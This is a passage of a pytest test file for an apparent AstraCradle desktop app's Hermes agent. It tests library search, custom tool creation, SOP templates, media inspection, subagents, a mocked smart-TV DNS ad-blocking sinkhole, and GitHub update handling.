        assert hm.get_library_max_bytes(AppConfig(hermes_library_max_gb=999)) == 200 * (1024**3)

        # 3. Search built-in common reference cards + store new item + flag incorrect + auto-prune
        st = hm.execute_tool("astra_knowledge_library", {"action": "stats"}, cfg)
        assert st["ok"] is True and st["skills_count"] >= 18 and st["max_gb"] == 200

        hits = hm.search_library("ROCR_VISIBLE_DEVICES ollama", limit=3)
        assert len(hits) >= 1 and any("ROCm" in h["title"] or "Ollama" in h["title"] for h in hits)

        stored = hm.store_library_item(
            title="Bad Outdated Tip",
            body="Deprecated command that no longer works.",
            category="web_doc",
            source_type="web",
            source_url="https://example.invalid/old-tip",
            config=cfg,
        )
        assert stored["ok"] is True
        hm.execute_tool("astra_knowledge_library", {"action": "mark_incorrect", "item_id": stored["item_id"], "reason": "Superseded"}, cfg)
        pruned = hm.execute_tool("astra_knowledge_library", {"action": "prune"}, cfg)
        assert pruned["ok"] is True and pruned["breakdown"]["incorrect"] >= 1

        # 4. Heavy model in _gpu_fallback_models routes to working GPU model (keeps tools + fast GPU)
        hm._save_gpu_fallback_model("qwen3.6:35b", "cpu_notools")
        r_gpu = hm.select_dynamic_ollama_model(
            "Inspect AstraCradle's codebase and propose improvements",
            AppConfig(hermes_local_only=True, hermes_mode="local_gpu", hermes_provider="ollama", hermes_model="qwen3.6:35b"),
            installed_models=["qwen3.6:35b", "qwen3:8b"],
            has_images=False,
        )
        assert r_gpu["model"] == "qwen3:8b"


def test_hermes_custom_tool_forge_create_combine_improve_and_run():
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(hermes_permission_level="standard_user", hermes_require_approval=False)
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        # 1. Create a composite tool combining two built-in tools and run it directly by name
        c1 = hm.execute_tool(
            "astra_custom_tool_forge",
            {
                "action": "create_composite",
                "name": "health_check",
                "description": "Checks system status and thermal baseline together",
                "steps": [
                    {"tool": "astra_system_status", "args": {}},
                    {"tool": "astra_thermals_and_fans", "args": {"action": "inspect"}},
                ],
            },
            cfg,
        )
        assert c1["ok"] is True and c1["tool"]["name"] == "custom_health_check"
        schema_names = {t["function"]["name"] for t in hm._tool_schemas()}
        assert "astra_custom_tool_forge" in schema_names and "custom_health_check" in schema_names

        run1 = hm.execute_tool("custom_health_check", {}, cfg)
        assert run1["ok"] is True and run1["steps_executed"] == 2

        # 2. Combine custom_health_check + astra_services_and_storage into a bigger composite tool
        c2 = hm.execute_tool(
            "astra_custom_tool_forge",
            {
                "action": "combine",
                "name": "full_sweep",
                "description": "Combined health + services sweep",
                "source_tools": ["custom_health_check", "astra_services_and_storage"],
            },
            cfg,
        )
        assert c2["ok"] is True and len(c2["tool"]["steps"]) == 3

        # 3. Improve custom_health_check (archives v1 snapshot and bumps to v2)
        imp = hm.execute_tool(
            "astra_custom_tool_forge",
            {
                "action": "improve",
                "name": "custom_health_check",
                "description": "Improved v2 health + services check",
                "improvement_note": "Added services audit",
                "steps": [
                    {"tool": "astra_system_status", "args": {}},
                    {"tool": "astra_services_and_storage", "args": {"action": "inspect"}},
                ],
            },
            cfg,
        )
        assert imp["ok"] is True and imp["tool"]["version"] == 2
        assert (hm.custom_tools_versions_dir / "custom_health_check.v1.json").exists()

        # 4. Python custom tool: blocked in safe_user, safety-checked in standard_user, runs in isolated subprocess
        blocked = hm.execute_tool(
            "astra_custom_tool_forge",
            {
                "action": "create_python",
                "name": "calc_score",
                "description": "Computes score",
                "code": "def run(args):\n    return {'ok': True, 'score': int(args.get('x', 2)) * 10}\n",
            },
            AppConfig(hermes_permission_level="safe_user"),
        )
        assert blocked["ok"] is False and blocked.get("blocked") is True

        py_ok = hm.execute_tool(
            "astra_custom_tool_forge",
            {
                "action": "create_python",
                "name": "calc_score",
                "description": "Computes multiplied score",
                "code": "def run(args):\n    return {'ok': True, 'score': int(args.get('x', 3)) * 10}\n",
            },
            cfg,
        )
        assert py_ok["ok"] is True and py_ok["tool"]["kind"] == "python"
        py_run = hm.execute_tool("custom_calc_score", {"x": 7}, cfg)
        assert py_run["ok"] is True and py_run["score"] == 70

        # 5. Toggle & delete
        hm.execute_tool("astra_custom_tool_forge", {"action": "toggle", "name": "custom_calc_score", "enabled": False}, cfg)
        disabled_run = hm.execute_tool("custom_calc_score", {"x": 1}, cfg)
        assert disabled_run["ok"] is False and "disabled" in disabled_run["error"].lower()
        hm.execute_tool("astra_custom_tool_forge", {"action": "delete", "name": "custom_calc_score"}, cfg)
        assert all(t["name"] != "custom_calc_score" for t in hm.list_custom_tools())


def test_ui_toast_event_log_filtering_and_ai_readback():
    import types
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.theme import get_palette
    from astracradle.ui.app import AstraCradleApp

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)

        pal = get_palette("dark")
        placed = []
        fake_app = types.SimpleNamespace(
            cfg_mgr=cm,
            palette=pal,
            toast_label=types.SimpleNamespace(configure=lambda **_kw: None),
            toast_undo_btn=types.SimpleNamespace(configure=lambda **_kw: None, pack=lambda *_a, **_kw: None, pack_forget=lambda: None),
            toast_frame=types.SimpleNamespace(place=lambda *_a, **_kw: placed.append("shown"), place_forget=lambda: None),
            topbar_status=types.SimpleNamespace(configure=lambda **_kw: None),
            _toast_after_id=None,
            _animate_toast_in=lambda _s: None,
            after=lambda _ms, _fn: "after-1",
            after_cancel=lambda _i: None,
        )
        fake_app._ui_events_log_path = lambda: AstraCradleApp._ui_events_log_path(fake_app)
        fake_app.record_ui_event = lambda m, level="info": AstraCradleApp.record_ui_event(fake_app, m, level=level)
        fake_app.get_recent_ui_events = lambda limit=80: AstraCradleApp.get_recent_ui_events(fake_app, limit=limit)
        fake_app._is_important_toast = lambda m, c, u: AstraCradleApp._is_important_toast(fake_app, m, c, u)

        # Routine button completion notice -> logged silently, NO popup overlay
        AstraCradleApp.show_toast(fake_app, "✓ Exit Full-Screen complete.", color=pal.accent_jade)
        assert placed == []

        # Important / error / undo notice -> logged AND popped up
        AstraCradleApp.show_toast(fake_app, "Hermes error: connection refused", color=pal.accent_coral)
        assert len(placed) == 1

        # Both notices are recorded in ui_events.log and readable by Hermes AI via astra_journal_and_crashes
        diag = hm.execute_tool("astra_journal_and_crashes", {"limit": 10}, cfg)
        assert diag["ok"] is True
        joined = "\n".join(diag.get("recent_ui_events") or [])
        assert "Exit Full-Screen complete." in joined
        assert "Hermes error: connection refused" in joined


def test_hermes_astra_prompt_grounding_and_markdown_fence_cleanup():
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.ui.pages import hermes_page

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)

        q = "What do you think of astra and the changes I have so far?"
        assert hm._prompt_needs_tools(q) is True
        sel_names = {t["function"]["name"] for t in hm._select_tool_schemas(q, hm._tool_schemas())}
        assert "astra_dev_self_build" in sel_names and "astra_git_sync" in sel_names
        assert "NEVER tell the user to run `astra_*` commands" in hm._build_system_prompt(cfg)

    cleaned = hermes_page._clean_bubble_markdown(
        "### **Next Steps:**\n---\n```bash\nastra_fix_safe --dry_run=false\n```\n"
        "| Issue | Severity | Recommendation |\n"
        "|------|----------|----------------|\n"
        "| Cache | Low | Clean up |\n"
    )
    assert "```" not in cleaned
    assert "---" not in cleaned
    assert "|" not in cleaned
    assert "Cache  —  Low  —  Clean up" in cleaned
    assert "Next Steps:" in cleaned


def test_hermes_sop_template_library_compose_instantiate_and_fast_learning():
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager, SOP_TEMPLATE_LIBRARY
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_permission_level="standard_user", hermes_require_approval=False)
        hm.ensure_hermes_home(cfg)

        # 1. All 20 built-in SOP templates seeded & searchable
        assert len(SOP_TEMPLATE_LIBRARY) >= 20
        lst = hm.execute_tool("astra_sop_templates", {"action": "list"}, cfg)
        assert lst["ok"] is True and lst["count"] >= 20

        # 2. Match SOP templates + verify 'astra_process_lookup' does not falsely pull dev/git tools
        q = "Worth doing #3 startup and skip #2 unless astra_process_lookup confirms ollama isn't Hermes"
        m = hm.execute_tool("astra_sop_templates", {"action": "match", "query": q, "limit": 2}, cfg)
        matched_ids = [x["template_id"] for x in m["matches"]]
        assert "sop_idle_ai_ram_safety" in matched_ids
        sel = {t["function"]["name"] for t in hm._select_tool_schemas(q, hm._tool_schemas())}
        assert "astra_process_lookup" in sel and "astra_startup_audit" in sel
        assert "astra_dev_self_build" not in sel

        # 3. Compose 2 SOP templates + instantiate into a runnable custom_sop tool
        comp = hm.execute_tool(
            "astra_sop_templates",
            {"action": "compose", "template_ids": ["sop_pc_health_triage", "sop_journal_crash_postmortem"]},
            cfg,
        )
        assert comp["ok"] is True and len(comp["composed"]["tool_pipeline"]) >= 3

        inst = hm.execute_tool(
            "astra_sop_templates",
            {
                "action": "instantiate_tool",
                "template_ids": ["sop_pc_health_triage", "sop_journal_crash_postmortem"],
                "tool_name": "custom_sop_health_and_journal",
            },
            cfg,
        )
        assert inst["ok"] is True and inst["tool"]["name"] == "custom_sop_health_and_journal"
        run_sop = hm.execute_tool("custom_sop_health_and_journal", {}, cfg)
        assert run_sop["ok"] is True and run_sop["steps_executed"] >= 3

        # 4. Fast 2-step SOP auto-learning inside run_prompt()
        turns = {"n": 0}

        def _fake_llm(_spec, _key, _msgs, _tools):
            turns["n"] += 1
            if turns["n"] == 1:
                return "", [
                    {"id": "c1", "function": {"name": "astra_system_status", "arguments": {}}},
                    {"id": "c2", "function": {"name": "astra_startup_audit", "arguments": {}}},
                ]
            return "Verified system status and startup audit.", []

        res = hm.run_prompt(
            "Check system status and startup entries cleanly",
            cfg,
            session_id="sop_learn_sess",
            llm_caller=_fake_llm,
        )
        assert res.ok is True
        learned_sops = [s for s in hm.list_sop_templates() if s.get("source") == "learned"]
        assert len(learned_sops) >= 1


def test_hermes_verify_work_audit_web_crosscheck_and_rebase_sop():
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_allow_web_search=False)
        hm.ensure_hermes_home(cfg)

        # 1. SOP matches detached HEAD / unmerged rebase cleanly
        m = hm.match_sop_templates("git status shows detached HEAD and unmerged files during rebase", limit=2)
        assert any(s["template_id"] == "sop_git_rebase_conflict_recovery" for s in m)

        # 2. audit_draft catches fake bash flags & missing paths
        bad = hm.execute_tool(
            "astra_verify_work",
            {
                "action": "audit_draft",
                "draft_text": "Run `astra_fix_safe --dry_run=false` and edit `astracradle/fake_router_v2.py`.",
            },
            cfg,
        )
        assert bad["verified"] is False and len(bad["warnings"]) >= 2

        # 3. verify_with_web returns local library hits + guidance cleanly even offline
        vw = hm.execute_tool(
            "astra_verify_work",
            {"action": "verify_with_web", "query": "ROCR_VISIBLE_DEVICES ollama"},
            cfg,
        )
        assert vw["ok"] is True and len(vw["local_library_hits"]) >= 1

        # 4. export_for_arena builds complete verification packet
        pkt = hm.execute_tool("astra_verify_work", {"action": "export_for_arena"}, cfg)
        assert pkt["ok"] is True and "AstraCradle Hermes Verification Packet" in pkt["packet"]


def test_hermes_library_topic_harvester_chunking_remaining_storage_and_removal():
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_library_max_gb=5, hermes_allow_web_search=True)
        hm.ensure_hermes_home(cfg)

        # 1. Default topics exist and stats show exact remaining space
        topics0 = hm.execute_tool("astra_knowledge_library", {"action": "list_topics"}, cfg)
        assert topics0["ok"] is True and topics0["count"] >= 3
        st0 = hm.execute_tool("astra_knowledge_library", {"action": "stats"}, cfg)
        assert st0["max_gb"] == 5 and st0["remaining_gb"] > 4.9 and st0["topics_count"] >= 3

        # 2. Add custom programming topic & harvest mocked official Python doc page (multi-chunk)
        add_r = hm.add_library_topic("Python 3.14 asyncio TaskGroup", category="programming", harvest_now=False, config=cfg)
        assert add_r["ok"] is True
        tid = add_r["topic"]["topic_id"]

        long_doc = "\n\n".join(
            [f"Section {i}: Python 3.14 asyncio.TaskGroup example\n" + ("async def main(): pass\n" * 60) for i in range(1, 5)]
        )
        hv = hm.harvest_library_topic(
            tid,
            cfg,
            searcher=lambda _q, _n: [
                {"title": "Python asyncio docs", "url": "https://docs.python.org/3/library/asyncio-task.html", "snippet": "TaskGroup docs"},
            ],
            fetcher=lambda _u: long_doc,
        )
        assert hv["ok"] is True and hv["pages_fetched"] == 1 and hv["stored_chunks"] >= 2

        # 3. Searchable in FTS5 & visible in list_items
        hits = hm.search_library("TaskGroup asyncio", limit=3)
        assert len(hits) >= 1 and "docs.python.org" in hits[0]["source_url"]
        items = hm.execute_tool("astra_knowledge_library", {"action": "list_items", "query": "TaskGroup"}, cfg)
        assert items["ok"] is True and items["count"] >= 2

        # 4. Delete one individual item, then remove the whole topic & verify cleanup
        del_one = hm.execute_tool("astra_knowledge_library", {"action": "delete_item", "item_id": items["items"][0]["item_id"]}, cfg)
        assert del_one["ok"] is True
        rem = hm.execute_tool("astra_knowledge_library", {"action": "remove_topic", "topic_id": tid, "remove_items": True}, cfg)
        assert rem["ok"] is True and rem["removed_items"] >= 1
        assert all(t["topic_id"] != tid for t in hm.list_library_topics())


def test_hermes_internal_first_deep_memory_and_multimodal_media_inspection(monkeypatch) -> None:
    import shutil
    import tempfile
    import zipfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_library_max_gb=5, hermes_allow_web_search=True)
        hm.ensure_hermes_home(cfg)

        # 1. Seed internal library + memory and verify manifest + deep_internal_recall
        hm.add_library_topic("Rust Tokio Async Patterns", category="programming", harvest_now=False, config=cfg)
        hm.store_library_item(
            title="Rust Tokio Select Pattern",
            body="tokio::select! lets async branches race cleanly without busy polling or wasted CPU cycles.",
            category="programming",
            source_url="https://tokio.rs/tokio/tutorial/select",
            tags="tokio select async rust",
            config=cfg,
        )
        manifest = hm.build_internal_memory_manifest()
        assert any("Rust Tokio Async Patterns" in t for t in manifest["topics"])
        assert "KnownTopics=" in hm._build_system_prompt(cfg)

        recall = hm.execute_tool("astra_knowledge_library", {"action": "deep_recall", "query": "tokio select async"}, cfg)
        assert recall["ok"] is True and recall["has_strong_match"] is True
        assert any("Tokio Select" in h["title"] for h in recall["library_hits"])

        # 2. web_search checks internal knowledge FIRST when strong match exists, unless force_web=True
        web_called = {"count": 0}

        def _fake_web(_q: str, max_results: int = 5):
            web_called["count"] += 1
            return [{"title": "Live Web Tokio", "url": "https://docs.rs/tokio", "snippet": "Live result"}]

        monkeypatch.setattr(hm, "_web_search_impl", _fake_web)
        cached_ws = hm.execute_tool("web_search", {"query": "tokio select async"}, cfg)
        assert cached_ws["ok"] is True and cached_ws["source"] == "internal_first_cache"
        assert web_called["count"] == 0

        forced_ws = hm.execute_tool("web_search", {"query": "tokio select async", "force_web": True}, cfg)
        assert forced_ws["ok"] is True and forced_ws["source"] == "live_web"
        assert web_called["count"] == 1

        # 3. Multimodal inspection: PNG picture, fake MP4 video (via ffprobe/ffmpeg), and real .docx Office XML
        pic_p = Path(td) / "sample_pic.png"
        # Minimal valid 1x1 RGBA PNG
        import base64
        pic_p.write_bytes(
            base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="
            )
        )
        imgs, ctx, names = hm.prepare_attachments([str(pic_p)])
        assert len(imgs) == 1 and "sample_pic.png" in names

        insp_pic = hm.execute_tool("astra_inspect_media", {"path": str(pic_p)}, cfg)
        assert insp_pic["ok"] is True and insp_pic["media_kind"] == "image" and str(pic_p) in insp_pic["image_paths"]

        docx_p = Path(td) / "report.docx"
        with zipfile.ZipFile(docx_p, "w") as zf:
            zf.writestr(
                "word/document.xml",
                '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>AstraCradle Quarterly Diagnostics OK</w:t></w:r></w:p></w:body></w:document>',
            )
        insp_doc = hm.execute_tool("astra_inspect_media", {"path": str(docx_p)}, cfg)
        assert insp_doc["ok"] is True and insp_doc["media_kind"] == "office"
        assert "AstraCradle Quarterly Diagnostics OK" in insp_doc["summary"]

        # Video inspection if ffmpeg/ffprobe are present, otherwise graceful metadata fallback
        vid_p = Path(td) / "clip.mp4"
        if shutil.which("ffmpeg"):
            import subprocess
            subprocess.run(
                ["ffmpeg", "-y", "-f", "lavfi", "-i", "color=c=blue:s=64x64:d=0.5", str(vid_p)],
                capture_output=True,
                timeout=15,
            )
        else:
            vid_p.write_bytes(b"\x00\x00\x00\x18ftypmp42")
        insp_vid = hm.execute_tool("astra_inspect_media", {"path": str(vid_p)}, cfg)
        assert insp_vid["ok"] is True and insp_vid["media_kind"] == "video"
        if shutil.which("ffmpeg") and vid_p.stat().st_size > 100:
            assert len(insp_vid["image_paths"]) >= 1


def test_hermes_subagents_persistence_and_full_os_autofix_escalation(monkeypatch) -> None:
    import json
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig(hermes_allow_web_search=True, hermes_permission_level="safe_user")
        hm.ensure_hermes_home(cfg)

        # 1. Verify persistence of MEMORY.md, pc_usage_profile.json, and subagents across re-init / upgrade
        hm.append_memory("User prefers CachyOS scx_lavd scheduler and 1GB VRAM reserve.", target="MEMORY.md")
        hm.pc_usage_path.write_text(json.dumps({"samples": 42, "apps": {"wow.exe": {"hits": 19, "category": "game"}}}), encoding="utf-8")
        cr = hm.execute_tool(
            "delegate_subagent",
            {
                "action": "create",
                "name": "Kernel Auditor",
                "role_instructions": "Audit Linux systemd and kernel logs cleanly.",
                "task": "Check systemd failed units",
            },
            cfg,
        )
        assert cr["ok"] is True and cr["subagent"]["name"] == "Kernel Auditor"

        # Simulate restart/upgrade calling ensure_hermes_home() again
        hm2 = HermesAgentManager(cm, ForensicJournal(cm))
        hm2.ensure_hermes_home(cfg)
        assert "scx_lavd" in hm2.memory_path.read_text(encoding="utf-8")
        assert hm2.get_pc_usage_profile()["samples"] == 42
        lst = hm2.execute_tool("delegate_subagent", {"action": "list"}, cfg)
        assert lst["ok"] is True and lst["count"] == 1 and lst["subagents"][0]["name"] == "Kernel Auditor"

        # Run subagent with mocked LLM caller & verify run counter + deletion
        run_sa = hm2.run_subagent(
            "Check status",
            cfg,
            subagent_id_or_name="Kernel Auditor",
            llm_caller=lambda _m, _t, _s, _k: ("Subagent audit: 0 failed units.", []),
        )
        assert run_sa["ok"] is True and "0 failed units" in run_sa["summary"]
        assert hm2.list_subagents()[0]["runs"] == 1
        del_sa = hm2.execute_tool("delegate_subagent", {"action": "delete", "name": "Kernel Auditor"}, cfg)
        assert del_sa["ok"] is True and len(hm2.list_subagents()) == 0

        # 2. Verify Full OS Auto-Fix: standard checks + web cross-check + stronger AI escalation + packet
        monkeypatch.setattr(hm2, "clipboard_write", lambda _t: (True, "copied"))
        af = hm2.run_full_os_autofix(
            cfg,
            apply_safe_fixes=False,
            web_crosscheck=True,
            escalate_stronger_ai=True,
            copy_escalation_packet=True,
            searcher=lambda q, _n: [{"title": f"OS Doc for {q}", "url": "https://wiki.archlinux.org", "snippet": "Verified OS tweak"}],
            escalate_llm_caller=lambda _m, _t, _s, _k: ("Stronger AI review: OS checks healthy, no unsafe mutations required.", []),
        )
        assert af["ok"] is True
        assert af["os_profile"]["system"]
        assert len(af["checks"]) >= 1
        assert "Stronger AI review" in af["escalation_summary"]
        assert "AstraCradle Full OS Auto-Fix Escalation" in af["escalation_packet"]
        assert af["copied_to_clipboard"] is True


def test_hermes_lan_smart_tv_youtube_detection_and_sinkhole_aim(monkeypatch) -> None:
    import tempfile
    from pathlib import Path
    from astracradle.core.adblock_shield import AstraShieldManager
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.lan_tv_shield import LanTvAdShield

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        journal = ForensicJournal(cm)
        shield = AstraShieldManager(cm, None, journal)
        lan_tv = LanTvAdShield(journal, state_dir=cm.base_dir)
        hm = HermesAgentManager(cm, journal, adblock_shield=shield, lan_tv_shield=lan_tv)
        cfg = AppConfig(hermes_permission_level="safe_user")
        hm.ensure_hermes_home(cfg)

        # 1. Both real-world user prompts must trigger tools & select astra_lan_and_sinkhole
        for p_txt in (
            "scan my network for all devices and find the samsung tv that is currently on youtube right now",
            "i want to aim  the tv at the sinkhole program",
        ):
            assert hm._prompt_needs_tools(p_txt) is True
            sel_names = {t["function"]["name"] for t in hm._select_tool_schemas(p_txt, hm._tool_schemas())}
            assert "astra_lan_and_sinkhole" in sel_names

        # 2. Mock LAN ARP + SSDP + Samsung DIAL YouTube active probe & verify scan_lan + aim_tv_at_sinkhole
        monkeypatch.setattr(lan_tv, "_probe_ssdp", lambda timeout=0.7: {"192.168.0.55": "Samsung Tizen TV DIAL"})
        monkeypatch.setattr(lan_tv, "_probe_mdns_tvs", lambda: {})
        monkeypatch.setattr(lan_tv, "_read_arp_table", lambda: {"192.168.0.55": "f4:7b:5e:11:22:33", "192.168.0.1": "aa:bb:cc:dd:ee:ff"})
        monkeypatch.setattr(
            lan_tv,
            "probe_tv_app_state",
            lambda ip, timeout=0.45: (
                {"model_name": "Living Room Samsung QN90C", "active_app": "YouTube (running)"}
                if ip == "192.168.0.55"
                else {"model_name": "", "active_app": ""}
            ),
        )
        monkeypatch.setattr(shield, "get_lan_ipv4", lambda: "192.168.0.193")
        monkeypatch.setattr(lan_tv, "get_default_gateway_ip", lambda: "192.168.0.1")
        monkeypatch.setattr(
            shield,
            "start_lan_dns_sinkhole",
            lambda **kw: (True, "LAN AstraShield DNS listening on 0.0.0.0:5353 (LAN IP 192.168.0.193)"),
        )

        scan_res = hm.execute_tool("astra_lan_and_sinkhole", {"action": "scan_lan"}, cfg)
        assert scan_res["ok"] is True
        assert any(d["ip"] == "192.168.0.55" and "YouTube (running)" in d["active_app"] for d in scan_res["youtube_active_devices"])

        aim_res = hm.execute_tool("astra_lan_and_sinkhole", {"action": "aim_tv_at_sinkhole", "brand_filter": "samsung"}, cfg)
        assert aim_res["ok"] is True
        assert aim_res["target_tv"]["ip"] == "192.168.0.55"
        assert aim_res["dns_primary"] == "192.168.0.193"
        assert aim_res["dns_secondary_failsafe"] == "192.168.0.1"
        assert cfg.astrashield_lan_tv_mode is True and cfg.astrashield_tv_auto_failsafe is True
        assert lan_tv.load_failsafe_state()["tv_ip"] == "192.168.0.55"
        assert "TizenBrew" in aim_res["plan"]["companion_mode"]

        # 3. YouTube playback domains stay unblocked while external YouTube & Samsung ad domains are blocked
        for safe_dom in ("rr3---sn-test.googlevideo.com", "youtubei.googleapis.com", "jnn-pa.googleapis.com", "i.ytimg.com"):
            blk, _ = shield.is_domain_blocked(safe_dom)
            assert blk is False, f"{safe_dom} must not be blocked!"
        for ad_dom in ("googleads.g.doubleclick.net", "ads.youtube.com", "samsungads.com", "config.samsungads.com"):
            blk, _ = shield.is_domain_blocked(ad_dom)
            assert blk is True, f"{ad_dom} should be blocked!"

        # 4. Pass-Through mode & Auto-revert / restore_tv
        pt_on = hm.execute_tool("astra_lan_and_sinkhole", {"action": "passthrough_on"}, cfg)
        assert pt_on["ok"] is True and pt_on["passthrough_mode"] is True and shield.is_paused() is True
        pt_off = hm.execute_tool("astra_lan_and_sinkhole", {"action": "passthrough_off"}, cfg)
        assert pt_off["ok"] is True and pt_off["passthrough_mode"] is False and shield.is_paused() is False

        rest_res = hm.execute_tool("astra_lan_and_sinkhole", {"action": "restore_tv"}, cfg)
        assert rest_res["ok"] is True
        assert lan_tv.load_failsafe_state()["active"] is False


def test_hourly_github_update_check_and_prompt_dedup() -> None:
    from types import SimpleNamespace
    from astracradle.core.config import AppConfig
    from astracradle.theme import get_palette
    from astracradle.ui.app import AstraCradleApp

    cfg = AppConfig()
    assert cfg.github_hourly_update_check is True
    assert cfg.github_check_interval_min == 60

    fake_app = SimpleNamespace(
        _show_startup_popups=True,
        config_obj=cfg,
        _github_check_in_flight=False,
        _last_github_check_ts=1000.0,
        _prompted_github_version="",
        palette=get_palette("dark"),
        show_toast=lambda *_a, **_kw: None,
        tray=SimpleNamespace(notify=lambda *_a, **_kw: None),
    )

    # Before 1 hour -> False; at +3600s -> True
    assert AstraCradleApp._should_run_hourly_github_check(fake_app, now_mono=4599.0) is False
    assert AstraCradleApp._should_run_hourly_github_check(fake_app, now_mono=4600.0) is True

    # Disabled or manual mode -> False
    cfg.github_hourly_update_check = False
    assert AstraCradleApp._should_run_hourly_github_check(fake_app, now_mono=5000.0) is False
    cfg.github_hourly_update_check = True
    cfg.auto_update_mode = "manual"
    assert AstraCradleApp._should_run_hourly_github_check(fake_app, now_mono=5000.0) is False

    # Prompt once per newly discovered out-of-date GitHub version
    asked: list[str] = []
    res1 = SimpleNamespace(update_available=True, latest_version="2.5.1 (abc1234)", status_message="Newer commit ready")
    binfo = {"display_version": "2.5.1 (old0000)"}

    def _ask_no(title: str, _msg: str) -> bool:
        asked.append(title)
        return False

    assert AstraCradleApp._prompt_github_update_available(fake_app, res1, binfo, ask_fn=_ask_no) is False
    assert len(asked) == 1
    # Same version does NOT nag again next hour
    assert AstraCradleApp._prompt_github_update_available(fake_app, res1, binfo, ask_fn=_ask_no) is False
    assert len(asked) == 1
    # Newer commit DOES ask again
    res2 = SimpleNamespace(update_available=True, latest_version="2.5.1 (def5678)", status_message="Even newer commit")
    assert AstraCradleApp._prompt_github_update_available(fake_app, res2, binfo, ask_fn=_ask_no) is False
    assert len(asked) == 2


def test_github_pull_updates_git_clone_directly(monkeypatch) -> None:
    import subprocess
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.updater import ModuleAndUpdateManager, UpdateCheckResult

    with tempfile.TemporaryDirectory() as td:
        repo = Path(td) / "AstraCradle"
        (repo / ".git").mkdir(parents=True)
        (repo / "astracradle").mkdir(parents=True)
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        upd = ModuleAndUpdateManager(cm, ForensicJournal(cm))
        cfg = AppConfig()

        monkeypatch.setattr(
            upd,
            "check_for_updates",
            lambda *_a, **_kw: UpdateCheckResult(
                current_version="2.5.1 (c085bea)",
                latest_version="2.5.1 (deadbee)",
                update_available=True,
                channel="stable",
                release_notes="https://github.com/jackbashroot-boop/AstraCradle/archive/deadbeef.zip",
                status_message="Newer GitHub push ready",
            ),
        )
        calls: list[list[str]] = []

        def _fake_run(cmd, **_kw):
            calls.append(list(cmd))
            return subprocess.CompletedProcess(cmd, 0, stdout="Updating c085bea..deadbee", stderr="")

        monkeypatch.setattr("astracradle.core.updater.subprocess.run", _fake_run)
        monkeypatch.setattr(
            upd,
            "get_local_build_info",
            lambda **_kw: {"version": "2.5.1", "short_sha": "deadbee", "display_version": "2.5.1 (deadbee)"},
        )

        ok, msg = upd.pull_from_github_and_update(cfg, repo_dir=repo, run_pip=True)
        assert ok is True and "deadbee" in msg
        assert any(c[:4] == ["git", "-C", str(repo), "fetch"] for c in calls)
        assert any(c[:4] == ["git", "-C", str(repo), "pull"] for c in calls)
        assert any("-e" in c and str(repo) in c for c in calls)


def test_hermes_delete_chat_session_and_ui_button() -> None:
    import tempfile
    from pathlib import Path
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "astra")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        cfg = AppConfig()
        hm.ensure_hermes_home(cfg)
        hm.append_memory("Keep this memory forever.", target="MEMORY.md")

        hm._append_session_message("sess_keep", "user", "keep me", title_hint="Keep Chat")
        hm._append_session_message("sess_old", "user", "old question", title_hint="Old Chat")
